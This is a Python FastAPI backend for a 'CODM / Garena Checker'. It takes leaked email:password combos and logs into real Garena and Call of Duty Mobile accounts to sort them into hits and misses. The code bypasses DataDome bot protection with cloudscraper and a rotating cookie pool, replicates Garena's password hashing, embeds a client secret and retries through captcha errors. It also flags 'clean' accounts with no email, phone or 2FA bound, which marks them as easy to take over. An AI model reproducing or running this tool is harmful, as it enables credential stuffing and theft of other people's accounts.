# ============================================================
#  routers/codm.py  —  CODM / Garena Checker Backend
#  Uses cloudscraper to bypass DataDome + correct endpoints
#  Flutter app calls POST /api/codm/check-one
# ============================================================

import hashlib
import base64
import json
import time
import random
import logging
import os
import urllib.parse

from fastapi import APIRouter
from pydantic import BaseModel
from typing import Optional

logger = logging.getLogger(__name__)
router = APIRouter()

# ── Dependency guards ─────────────────────────────────────────
try:
    import cloudscraper
    _HAS_CLOUDSCRAPER = True
except ImportError:
    _HAS_CLOUDSCRAPER = False
    logger.warning("⚠️  cloudscraper not installed — CODM checker disabled")

try:
    from Crypto.Cipher import AES
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
    logger.warning("⚠️  pycryptodome not installed — CODM checker disabled")

# ── User-Agents (matching the working Python script exactly) ──
_UA_NEW = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
_UA_OLD = (
    "Mozilla/5.0 (Linux; Android 11; RMX2195) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
)
_UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"

# ── CODM client secret (same as Python script) ────────────────
_CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"


# ─────────────────────────────────────────────────────────────
#  Crypto helpers  (identical to Python script)
# ─────────────────────────────────────────────────────────────

def _md5(s: str) -> str:
    return hashlib.md5(urllib.parse.unquote(s).encode("utf-8")).hexdigest()

def _sha256(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

def _aes_ecb(passmd5: str, outer_hash: str) -> str:
    key = bytes.fromhex(outer_hash)
    plaintext = bytes.fromhex(passmd5)
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext).hex()[:32]

def hash_password(password: str, v1: str, v2: str) -> str:
    passmd5 = _md5(password)
    inner_hash = _sha256(passmd5 + v1)
    outer_hash = _sha256(inner_hash + v2)
    return _aes_ecb(passmd5, outer_hash)

def _gen_uuid() -> str:
    r = list(os.urandom(16))
    r[6] = (r[6] & 0x0F) | 0x40
    r[8] = (r[8] & 0x3F) | 0x80
    parts = [r[0:4], r[4:6], r[6:8], r[8:10], r[10:16]]
    return "-".join("".join(f"{b:02x}" for b in g) for g in parts)


# ─────────────────────────────────────────────────────────────
#  Cookie pool  (from env CODM_COOKIES, newline-separated)
#  Each line: "datadome=VALUE" or full cookie string
#  Admin panel / Railway env var to add/refresh cookies
# ─────────────────────────────────────────────────────────────

def _pick_datadome() -> Optional[str]:
    raw = os.getenv("CODM_COOKIES", "")
    lines = [l.strip() for l in raw.splitlines() if l.strip()]
    if not lines:
        return None
    line = random.choice(lines)
    for part in line.split(";"):
        part = part.strip()
        if part.lower().startswith("datadome="):
            return part.split("=", 1)[1]
    return None


# ─────────────────────────────────────────────────────────────
#  Session factory
# ─────────────────────────────────────────────────────────────

def _make_session(datadome: Optional[str] = None):
    session = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "android", "mobile": True},
        delay=1,
    )
    session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
    if datadome:
        session.cookies.set("datadome", datadome, domain=".garena.com")
    return session


# ─────────────────────────────────────────────────────────────
#  Step 1 — Prelogin  (100082.connect.garena.com, app_id=100082)
# ─────────────────────────────────────────────────────────────

def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
    for attempt in range(3):
        try:
            ts = int(time.time() * 1000)
            params = {
                "app_id": "100082",
                "account": account,
                "format": "json",
                "id": str(ts),
            }
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Host": "100082.connect.garena.com",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
                ),
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "User-Agent": _UA_NEW,
                "X-Requested-With": "com.garena.game.codm",
            }
            res = session.get(
                "https://100082.connect.garena.com/api/prelogin",
                headers=headers,
                params=params,
                timeout=20,
            )
            if res.status_code == 403:
                logger.warning(f"Prelogin 403 attempt {attempt+1}")
                time.sleep(2)
                continue
            if res.status_code != 200:
                continue
            data = res.json()
            if "error" in data:
                return None, None
            v1 = data.get("v1")
            v2 = data.get("v2")
            if v1 and v2:
                return v1, v2
        except Exception as e:
            logger.warning(f"Prelogin attempt {attempt+1} error: {e}")
            time.sleep(1)
    return None, None


# ─────────────────────────────────────────────────────────────
#  Step 2 — Login  (100082.connect.garena.com)
# ─────────────────────────────────────────────────────────────

def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Optional[str], str]:
    hashed_pw = hash_password(password, v1, v2)
    for attempt in range(3):
        try:
            ts = int(time.time() * 1000)
            params = {
                "app_id": "100082",
                "account": account,
                "password": hashed_pw,
                "redirect_uri": "gop100082://auth/",
                "format": "json",
                "id": str(ts),
            }
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Host": "100082.connect.garena.com",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
                ),
                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "User-Agent": _UA_NEW,
                "X-Requested-With": "com.garena.game.codm",
            }
            res = session.get(
                "https://100082.connect.garena.com/api/login",
                headers=headers,
                params=params,
                timeout=20,
            )
            if res.status_code != 200:
                time.sleep(1)
                continue
            data = res.json()
            if "error" in data:
                err = str(data["error"]).lower()
                if "captcha" in err:
                    time.sleep(3)
                    continue
                return None, "wrong_password"
            # sso_key from body or session cookies
            sso_key = data.get("sso_key") or session.cookies.get("sso_key")
            if sso_key:
                return sso_key, "ok"
        except Exception as e:
            logger.warning(f"Login attempt {attempt+1} error: {e}")
            time.sleep(1)
    return None, "failed"


# ─────────────────────────────────────────────────────────────
#  Step 3 — Account info  (account.garena.com)
# ─────────────────────────────────────────────────────────────

def _account_info(session, sso_key: str) -> Optional[dict]:
    try:
        session.cookies.set("sso_key", sso_key, domain=".garena.com")
        res = session.get(
            "https://account.garena.com/api/account/init",
            headers={"Accept": "application/json", "User-Agent": _UA_NEW},
            timeout=20,
        )
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        logger.warning(f"Account info error: {e}")
    return None


# ─────────────────────────────────────────────────────────────
#  Step 4a — CODM access token  (new 100082 flow)
# ─────────────────────────────────────────────────────────────

def _codm_token_new(session, sso_key: str) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))

        # Grant — get auth code
        grant_headers = {
            "Host": "100082.connect.garena.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent": _UA_NEW,
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": (
                "https://100082.connect.garena.com/universal/oauth"
                "?client_id=100082&locale=en-US&create_grant=true"
                "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
            ),
            "Accept-Language": "en-US,en;q=0.9",
        }
        session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
        grant_body = urllib.parse.urlencode({
            "client_id": "100082",
            "response_type": "code",
            "redirect_uri": "gop100082://auth/",
            "create_grant": "true",
            "login_scenario": "normal",
            "format": "json",
            "id": ts,
        })
        grant_res = session.post(
            "https://100082.connect.garena.com/oauth/token/grant",
            headers=grant_headers,
            data=grant_body,
            timeout=15,
        )
        grant_res.raise_for_status()
        auth_code = grant_res.json().get("code")
        if not auth_code:
            return None

        # Exchange — get access token
        device_id = f"02-{_gen_uuid()}"
        exchange_body = urllib.parse.urlencode({
            "grant_type": "authorization_code",
            "code": auth_code,
            "device_id": device_id,
            "redirect_uri": "gop100082://auth/",
            "source": "2",
            "client_id": "100082",
            "client_secret": _CLIENT_SECRET,
        })
        exchange_res = session.post(
            "https://100082.connect.garena.com/oauth/token/exchange",
            headers={
                "User-Agent": _UA_SDK,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "100082.connect.garena.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            },
            data=exchange_body,
            timeout=15,
        )
        exchange_res.raise_for_status()
        return exchange_res.json().get("access_token")

    except Exception as e:
        logger.warning(f"CODM new token flow failed: {e}")
        return None


# ─────────────────────────────────────────────────────────────
#  Step 4b — CODM access token  (old auth.garena.com fallback)
# ─────────────────────────────────────────────────────────────

def _codm_token_old(session) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))
        res = session.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={
                "User-Agent": _UA_OLD,
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": (
                    "https://auth.garena.com/universal/oauth?all_platforms=1"
                    "&response_type=token&locale=en-SG&client_id=100082"
                    "&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n"
                    "?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
                ),
            },
            data=(
                "client_id=100082&response_type=token"
                "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                f"&format=json&id={ts}"
            ),
            timeout=15,
        )
        return res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM old token flow failed: {e}")
        return None


# ─────────────────────────────────────────────────────────────
#  Step 5 — CODM OAuth callback → codm_token
# ─────────────────────────────────────────────────────────────

def _codm_callback(session, access_token: str, old_flow: bool = False) -> Optional[dict]:
    bases = (
        ["https://api-delete-request.codm.garena.co.id"]
        if old_flow
        else [
            "https://api-delete-request-aos.codm.garena.co.id",
            "https://api-delete-request.codm.garena.co.id",
        ]
    )
    for base in bases:
        try:
            res = session.get(
                f"{base}/oauth/callback/?access_token={access_token}",
                headers={
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                },
                timeout=15,
                allow_redirects=False,
            )
            loc = res.headers.get("location", "")
            if "err=3" in loc:
                return {"status": "no_codm"}
            if "token=" in loc:
                parsed = urllib.parse.urlparse(loc)
                tok = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
                if tok:
                    return {"status": "ok", "token": tok}
        except Exception as e:
            logger.warning(f"CODM callback failed for {base}: {e}")
    return None


# ─────────────────────────────────────────────────────────────
#  Step 6 — CODM user info  (JWT decode first, then API)
# ─────────────────────────────────────────────────────────────

def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
    # Try JWT decode first (no network needed)
    try:
        parts = token.split(".")
        if len(parts) == 3:
            p = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p))
            user = payload.get("user")
            if user:
                return user
    except Exception:
        pass

    # Fallback: API call
    base = (
        "https://api-delete-request.codm.garena.co.id"
        if old_flow
        else "https://api-delete-request-aos.codm.garena.co.id"
    )
    try:
        res = session.get(
            f"{base}/oauth/check_login/",
            headers={
                "authority": base.replace("https://", ""),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "codm-delete-token": token,
                "User-Agent": _UA_OLD if old_flow else _UA_NEW,
                "X-Requested-With": "XMLHttpRequest",
                "x-requested-with": "com.garena.game.codm",
            },
            timeout=15,
        )
        data = res.json()
        return data.get("user", {})
    except Exception as e:
        logger.warning(f"CODM user info API failed: {e}")
        return {}


# ─────────────────────────────────────────────────────────────
#  Parse Garena account details
# ─────────────────────────────────────────────────────────────

def _parse_account(data: dict) -> dict:
    u = data.get("user_info", data)
    email = u.get("email", "")
    mobile = u.get("mobile_no", "")
    email_v = u.get("email_v") in (1, True)
    fb = u.get("is_fbconnect_enabled") in (1, True)
    id_card = u.get("idcard", "")
    two_step = u.get("two_step_verify_enable") in (1, True)

    binds = []
    if email_v or (email and not email.startswith("*") and "@" in email):
        binds.append("Email")
    if mobile and mobile.strip() and mobile != "N/A":
        binds.append("Phone")
    if fb:
        binds.append("Facebook")
    if id_card and id_card.strip() and id_card != "N/A":
        binds.append("ID Card")
    if two_step:
        binds.append("2FA")

    return {
        "shell": str(u.get("shell", 0)),
        "country": str(u.get("acc_country", "")),
        "is_clean": len(binds) == 0,
        "binds": binds,
        "two_step": two_step,
        "email": email,
    }


# ─────────────────────────────────────────────────────────────
#  Pydantic models
# ─────────────────────────────────────────────────────────────

class CheckOneRequest(BaseModel):
    combo: str
    user_id: Optional[str] = None

class CheckOneResponse(BaseModel):
    combo: str
    status: str        # "hit" | "valid_no_codm" | "bad" | "error"
    detail: str = ""
    nickname: str = ""
    level: str = ""
    region: str = ""
    uid: str = ""
    shell: str = ""
    country: str = ""
    is_clean: bool = False
    binds: list = []


# ─────────────────────────────────────────────────────────────
#  Endpoint: POST /api/codm/check-one
# ─────────────────────────────────────────────────────────────

@router.post("/check-one", response_model=CheckOneResponse)
async def check_one(req: CheckOneRequest):
    if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
        return CheckOneResponse(
            combo=req.combo,
            status="error",
            detail="Server missing deps: cloudscraper or pycryptodome. Contact admin.",
        )

    combo = req.combo.strip()
    if ":" not in combo:
        return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")

    account, password = combo.split(":", 1)
    account = account.strip()
    password = password.strip()
    if not account or not password:
        return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")

    datadome = _pick_datadome()
    session = _make_session(datadome)

    try:
        # Step 1: Prelogin
        v1, v2 = _prelogin(session, account)
        if not v1 or not v2:
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Prelogin failed — account may not exist or IP blocked",
            )

        # Step 2: Login
        sso_key, login_status = _login(session, account, password, v1, v2)
        if not sso_key:
            return CheckOneResponse(
                combo=combo, status="bad",
                detail="Wrong password or account suspended",
            )

        # Step 3: Account info
        info = _account_info(session, sso_key)
        acc = _parse_account(info) if info else {
            "shell": "", "country": "", "is_clean": False, "binds": []
        }

        # Step 4: CODM access token — new flow first, old as fallback
        access_token = _codm_token_new(session, sso_key)
        old_flow = False
        if not access_token:
            access_token = _codm_token_old(session)
            old_flow = True

        if not access_token:
            return CheckOneResponse(
                combo=combo,
                status="valid_no_codm",
                detail="Valid Garena account — CODM token fetch failed",
                shell=acc["shell"],
                country=acc["country"],
                is_clean=acc["is_clean"],
                binds=acc.get("binds", []),
            )

        # Step 5: OAuth callback
        cb = _codm_callback(session, access_token, old_flow=old_flow)
        if not cb or cb.get("status") == "no_codm":
            return CheckOneResponse(
                combo=combo,
                status="valid_no_codm",
                detail="Valid Garena account — No CODM linked",
                shell=acc["shell"],
                country=acc["country"],
                is_clean=acc["is_clean"],
                binds=acc.get("binds", []),
            )

        # Step 6: CODM user info
        user = _codm_user_info(session, cb["token"], old_flow=old_flow)

        return CheckOneResponse(
            combo=combo,
            status="hit",
            nickname=str(user.get("codm_nickname") or user.get("nickname") or ""),
            level=str(user.get("codm_level") or ""),
            region=str(user.get("region") or ""),
            uid=str(user.get("uid") or ""),
            shell=acc["shell"],
            country=acc["country"],
            is_clean=acc["is_clean"],
            binds=acc.get("binds", []),
            detail="HIT",
        )

    except Exception as e:
        logger.error(f"CODM check error for {account}: {e}")
        return CheckOneResponse(
            combo=combo, status="error",
            detail=f"Server error: {str(e)[:100]}",
        )
    finally:
        try:
            session.close()
        except Exception:
            pass
